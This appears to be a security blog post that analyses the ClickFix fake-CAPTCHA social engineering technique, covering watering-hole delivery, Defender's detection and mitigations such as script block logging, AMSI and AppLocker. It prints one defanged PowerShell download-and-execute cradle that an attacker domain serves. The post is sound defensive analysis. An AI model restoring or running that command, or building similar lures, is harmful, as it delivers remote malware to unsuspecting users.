---
layout: ../../layouts/PostLayout.astro
title: "ClickFix: How a Fake CAPTCHA Runs PowerShell on Your Machine"
description: "A breakdown of the ClickFix social engineering technique, how it works under the hood, and what a real detection looks like."
pubDate: 2026-09-02
tags: ["threat-intel", "detection"]
---

## What is ClickFix

ClickFix is one of those attacks that works because it asks the user to do the work for it.

No exploit. No drive-by download. Just a fake CAPTCHA or error page that tells you to press Win + R, paste a command, and hit Enter. The command is already in your clipboard. You just provided the execution environment.

## How it works

The attack flow is straightforward:

1. User lands on a compromised or attacker-controlled page
2. A fake CAPTCHA or browser error prompt appears
3. The page instructs the user to "verify" by pressing Win + R and pasting a command
4. The clipboard already contains the malicious payload -- usually a PowerShell one-liner
5. User pastes and executes it themselves, bypassing most endpoint controls

The reason it is effective is that the user is the process initiator. Many security tools are tuned to flag suspicious parent processes -- a browser spawning PowerShell, for example. ClickFix sidesteps this entirely by having the user open Run directly.

## What the payload looks like

A recently observed example shows the pattern clearly. The domain below is defanged -- do not remove the brackets, do not copy this into a browser, a terminal, or anywhere else. It is included for analysis purposes only.

    powershell.exe -c iex(irm hxxps://cwemuaexpapuk[.]mamglaqwek[.]com/s/psc3 -UseBasicParsing)

Breaking it down:

- iex -- Invoke-Expression, executes whatever string is passed to it
- irm -- Invoke-RestMethod, downloads content from a URL
- -UseBasicParsing -- bypasses Internet Explorer's DOM parser, works on any Windows system regardless of IE config
- The URL is a remote staging server serving the second-stage payload

This is a classic download-and-execute cradle. The initial command is intentionally short -- just enough to pull down and run whatever the attacker has staged remotely. The real malicious logic lives on the server, not in the clipboard. The domain itself follows a pattern common to ClickFix infrastructure: randomly generated subdomain, generic TLD, short-lived registration. These are cheap to spin up and easy to rotate, which is why blocking on domain reputation alone is not sufficient.

## What Defender caught

Microsoft Defender flagged this as Trojan:Win32/ClickFix.Q!ml and blocked execution before the remote payload could be fetched. Remediation was automatic. The detection fired on the command line pattern itself -- the combination of iex, irm, and an external domain is a strong behavioral signal.

## Where these attacks land

A pattern worth noting: a significant portion of ClickFix encounters do not originate from phishing emails or malicious ads. They come from legitimate websites that have been compromised -- what is known as a watering hole attack.

The attacker identifies a site that a specific type of user regularly visits, compromises it, and injects the ClickFix overlay. The victim navigates to a domain they trust, sees what looks like a browser or CAPTCHA error, and follows the instructions.

In practice, smaller business websites are disproportionately targeted because they tend to run outdated CMS installations, have no active monitoring, and may go months without anyone noticing the compromise. Medical offices and dental practices show up frequently in this pattern -- their websites exist primarily for appointment booking and patient information, not as a security priority. Vendors and patients visiting those sites get hit without any indication that anything is wrong with the page they are on.

This is what makes watering holes particularly effective: the trust is inherited from the legitimate domain. The user did not click a suspicious link. They went where they always go.

## Why users fall for it

The social engineering works because it exploits a trust gap. Users have been trained to complete CAPTCHA challenges -- they are a normal part of browsing. A fake CAPTCHA that requires an extra step feels unusual, but not immediately suspicious to someone who is not thinking about it.

The instruction to open Run and paste is framed as a verification step, not a security risk. Most users have no mental model for what the Run dialog does or why pasting into it is dangerous. That is the attack surface -- not a technical vulnerability, but a knowledge gap.

## Detection and prevention

A few things that help:

- PowerShell script block logging -- logs the actual content of scripts at execution time, catches obfuscated payloads that evade command-line inspection
- AMSI -- Antimalware Scan Interface hooks into PowerShell and other scripting engines to scan content before execution
- Security awareness training -- specifically covering the Run dialog and clipboard-based attacks. This is a technique that awareness programs rarely address explicitly, and it should be
- AppLocker or WDAC -- restricting which users can execute PowerShell significantly reduces blast radius even when a user follows through

The Defender detection in this case did its job. But the better outcome is a user who sees the instruction and does not follow it in the first place.
